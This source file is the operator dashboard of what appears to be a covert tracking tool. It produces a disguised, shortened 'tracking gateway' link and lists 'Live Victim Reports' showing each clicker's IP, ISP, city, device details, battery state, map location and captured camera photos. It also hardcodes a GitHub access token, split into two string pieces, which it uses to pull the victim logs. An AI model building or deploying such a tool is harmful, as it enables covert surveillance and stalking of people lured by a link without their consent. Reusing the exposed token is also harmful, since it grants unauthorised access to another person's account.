
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { auth } from '../firebase';

interface LogEntry {
  id: string;
  time: string;
  ip: string;
  isp: string;
  city: string;
  platform: string;
  userAgent: string;
  ram: string;
  cores: number | string;
  screen: string;
  network: string;
  battery: any;
  location: any;
  photos: string[];
  userId: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [shortUrl, setShortUrl] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);
  const [viewMap, setViewMap] = useState<{lat: number, lng: number} | null>(null);
  const [viewPhotos, setViewPhotos] = useState<string[] | null>(null);

  const G_OWNER = "arefinfoysalo";
  const G_REPO = "livecameralocation";
  const P1 = "ghp_S06vJDMF26hmKNIc";
  const P2 = "EXibFC2GFggjTf40WyXZ";
  const G_TOKEN = P1 + P2;
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  const fetchLogs = async () => {
    try {
      const res = await fetch(`https://api.github.com/repos/${G_OWNER}/${G_REPO}/contents/data/logs`, {
        headers: { 'Authorization': `token ${G_TOKEN}` }
      });
      if (!res.ok) { setLoading(false); return; }
      const files = await res.json();
      
      const logPromises = files.filter((f: any) => f.name.endsWith('.json')).map(async (file: any) => {
        const contentRes = await fetch(file.download_url);
        return await contentRes.json();
      });

      const allLogs = await Promise.all(logPromises);
      const myLogs = allLogs.filter(l => l.userId === user.uid);
      setLogs(myLogs.sort((a, b) => b.time.localeCompare(a.time)));
    } catch (e) { console.error(e); } finally { setLoading(false); }
  };

  const shortenUrl = async () => {
    try {
      const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      const data = await res.text();
      setShortUrl(data);
    } catch (e) { alert("Shortener service error."); }
  };

  useEffect(() => {
    fetchLogs();
    const interval = setInterval(fetchLogs, 8000);
    return () => clearInterval(interval);
  }, [user.uid]);

  return (
    <div className="min-h-screen bg-[#F8FAFC] font-['Hind_Siliguri'] text-slate-800 pb-20">
      {/* 1. Header Section */}
      <header className="bg-white border-b px-6 py-8 md:px-12 sticky top-0 z-40 shadow-sm">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
           <div>
              <h1 className="text-3xl font-black text-slate-900 tracking-tight">Hello, {user.displayName || user.email?.split('@')[0]}</h1>
              <p className="text-blue-600 font-bold text-sm uppercase tracking-widest mt-1">Welcome to your dashboard</p>
           </div>
           <button onClick={() => signOut(auth)} className="bg-slate-100 hover:bg-red-50 hover:text-red-600 text-slate-500 px-8 py-3 rounded-2xl font-black text-xs transition-all border border-slate-200">LOGOUT SYSTEM</button>
        </div>
      </header>

      <main className="max-w-7xl mx-auto p-4 md:p-8 space-y-10">
        
        {/* 2. Link Controls (Top Priority) */}
        <section className="grid grid-cols-1 lg:grid-cols-3 gap-6">
           <div className="lg:col-span-2 bg-white p-8 rounded-[40px] border border-slate-200 shadow-sm">
              <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest block mb-4">Your Tracking Gateway</label>
              <div className="flex flex-col md:flex-row gap-3">
                 <input readOnly value={trackerLink} className="flex-1 bg-slate-50 border border-slate-100 px-6 py-4 rounded-3xl text-xs font-mono text-slate-500" />
                 <button onClick={() => { navigator.clipboard.writeText(trackerLink); setCopySuccess(true); setTimeout(()=>setCopySuccess(false), 2000); }} 
                   className="bg-blue-600 text-white px-10 py-4 rounded-3xl font-black text-xs hover:bg-blue-700 shadow-xl shadow-blue-100">
                   {copySuccess ? 'COPIED!' : 'COPY LINK'}
                 </button>
              </div>
           </div>

           <div className="bg-slate-900 p-8 rounded-[40px] text-white flex flex-col justify-between">
              <p className="text-[10px] font-black uppercase opacity-50 tracking-widest">URL Shortner</p>
              <div className="mt-4 space-y-3">
                 <button onClick={shortenUrl} className="w-full bg-blue-600 py-4 rounded-3xl font-black text-xs hover:bg-blue-500">GENERATE TINYURL</button>
                 {shortUrl && <div className="text-[11px] font-mono bg-white/10 p-3 rounded-xl border border-white/5 break-all">{shortUrl}</div>}
              </div>
           </div>
        </section>

        {/* 3. Victim Logs (100% Real-time Confirmed) */}
        <div className="space-y-6">
           <div className="flex items-center justify-between px-4">
              <h2 className="text-xl font-black uppercase tracking-tighter">Live Victim Reports</h2>
              <div className="flex items-center gap-2 bg-green-100 text-green-600 px-4 py-1.5 rounded-full">
                 <div className="w-2 h-2 bg-green-500 rounded-full animate-ping"></div>
                 <span className="text-[10px] font-black uppercase">Realtime Sync Active</span>
              </div>
           </div>

           {loading ? (
             <div className="bg-white rounded-[40px] py-24 text-center border border-slate-100 animate-pulse text-slate-300 font-black italic">FETCHING RECENT ACTIVITY...</div>
           ) : logs.length === 0 ? (
             <div className="bg-white rounded-[40px] py-32 text-center border-2 border-dashed border-slate-200">
                <p className="text-slate-400 font-bold italic">No data found. Send the link to get victims.</p>
             </div>
           ) : (
             <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
               {logs.map((log, i) => (
                 <div key={i} className="bg-white rounded-[45px] border border-slate-200 overflow-hidden hover:shadow-2xl hover:shadow-slate-100 transition-all group">
                    <div className="p-8 space-y-6">
                       <div className="flex justify-between items-start">
                          <div>
                             <h3 className="text-2xl font-black text-slate-900 leading-none">{log.ip}</h3>
                             <p className="text-[11px] font-black text-blue-600 mt-1 uppercase tracking-tighter">{log.isp} • {log.city}</p>
                          </div>
                          <span className="bg-slate-50 text-slate-400 px-3 py-1 rounded-full text-[9px] font-black">#{logs.length - i}</span>
                       </div>

                       <div className="grid grid-cols-2 gap-3">
                          <div className="bg-slate-50/50 p-5 rounded-[30px] border border-slate-100">
                             <p className="text-[8px] font-black text-slate-400 uppercase mb-2">Device Info</p>
                             <p className="text-[11px] font-black text-slate-700 truncate">{log.platform}</p>
                             <p className="text-[11px] font-black text-slate-700">{log.ram} RAM • {log.cores} Core</p>
                             <p className="text-[11px] font-black text-slate-700">{log.screen}</p>
                          </div>
                          <div className="bg-slate-50/50 p-5 rounded-[30px] border border-slate-100">
                             <p className="text-[8px] font-black text-slate-400 uppercase mb-2">Battery & State</p>
                             <p className="text-[11px] font-black text-slate-700">Level: {typeof log.battery === 'object' ? `${log.battery.level}%` : 'N/A'}</p>
                             <p className="text-[11px] font-black text-slate-700">Status: {log.battery?.charging ? '⚡ Charging' : '🔋 Unplugged'}</p>
                             <p className="text-[10px] font-bold text-slate-300 mt-1">{log.time}</p>
                          </div>
                       </div>

                       <div className="flex gap-3">
                          <button 
                            disabled={!log.photos || log.photos.length === 0}
                            onClick={() => setViewPhotos(log.photos)}
                            className={`flex-1 py-5 rounded-[25px] text-[11px] font-black transition-all ${log.photos?.length > 0 ? 'bg-slate-900 text-white' : 'bg-slate-100 text-slate-300'}`}
                          >
                            GALLERY ({log.photos?.length || 0})
                          </button>
                          <button 
                            disabled={typeof log.location !== 'object'}
                            onClick={() => setViewMap(log.location)}
                            className={`flex-1 py-5 rounded-[25px] text-[11px] font-black transition-all ${typeof log.location === 'object' ? 'bg-blue-600 text-white shadow-xl shadow-blue-100' : 'bg-slate-100 text-slate-300'}`}
                          >
                            VIEW LOCATION
                          </button>
                       </div>
                    </div>
                 </div>
               ))}
             </div>
           )}
        </div>

        {/* 4. Developer Details (Absolute Bottom) */}
        <footer className="mt-20 pt-10 border-t border-slate-200 text-center">
           <div className="max-w-md mx-auto bg-white p-10 rounded-[50px] shadow-sm border border-slate-100">
              <div className="w-20 h-20 bg-blue-600 rounded-[30px] mx-auto mb-4 flex items-center justify-center text-white text-3xl font-black shadow-xl shadow-blue-100">AF</div>
              <h4 className="text-xl font-black text-slate-900">Arefin Foysal</h4>
              <p className="text-xs text-slate-400 font-bold uppercase tracking-widest mt-1">Full-Stack Developer</p>
              <div className="flex justify-center gap-4 mt-6">
                 <a href="https://facebook.com" className="bg-blue-50 text-blue-600 px-6 py-3 rounded-2xl font-black text-[10px] hover:bg-blue-600 hover:text-white transition-all">FACEBOOK</a>
                 <a href="#" className="bg-slate-50 text-slate-600 px-6 py-3 rounded-2xl font-black text-[10px] hover:bg-slate-900 hover:text-white transition-all">GITHUB</a>
              </div>
           </div>
           <p className="text-[10px] text-slate-300 font-black uppercase mt-8 tracking-[0.4em]">© 2024 AREFIN VAULT SECURE SYSTEM</p>
        </footer>
      </main>

      {/* Modals */}
      {viewPhotos && (
        <div className="fixed inset-0 z-[100] bg-slate-900/95 backdrop-blur-xl flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-4xl rounded-[60px] overflow-hidden">
              <div className="p-8 flex justify-between items-center border-b">
                 <h4 className="font-black text-slate-800 uppercase tracking-widest">Target Burst Gallery</h4>
                 <button onClick={() => setViewPhotos(null)} className="w-10 h-10 bg-slate-100 rounded-full flex items-center justify-center font-bold">✕</button>
              </div>
              <div className="p-10 grid grid-cols-1 md:grid-cols-3 gap-6">
                 {viewPhotos.map((url, i) => (
                   <img key={i} src={url} className="w-full h-72 object-cover rounded-[40px] border-8 border-slate-50 shadow-lg" alt={`Shot ${i+1}`} />
                 ))}
              </div>
              <div className="p-8 text-center border-t bg-slate-50/50">
                 <button onClick={() => setViewPhotos(null)} className="bg-slate-900 text-white px-12 py-4 rounded-3xl font-black text-xs">CLOSE GALLERY</button>
              </div>
           </div>
        </div>
      )}

      {viewMap && (
        <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-2xl rounded-[60px] overflow-hidden">
              <div className="p-8 flex justify-between items-center border-b">
                 <h4 className="font-black text-slate-800 uppercase tracking-widest">Geolocation Intel</h4>
                 <button onClick={() => setViewMap(null)} className="w-10 h-10 bg-slate-100 rounded-full flex items-center justify-center font-bold">✕</button>
              </div>
              <iframe width="100%" height="450" frameBorder="0" src={`https://maps.google.com/maps?q=${viewMap.lat},${viewMap.lng}&z=16&output=embed`}></iframe>
              <div className="p-8 text-center bg-slate-50/50">
                 <a href={`https://www.google.com/maps?q=${viewMap.lat},${viewMap.lng}`} target="_blank" className="bg-blue-600 text-white px-12 py-5 rounded-3xl font-black text-xs block text-center shadow-xl shadow-blue-100">OPEN IN GOOGLE MAPS</a>
              </div>
           </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
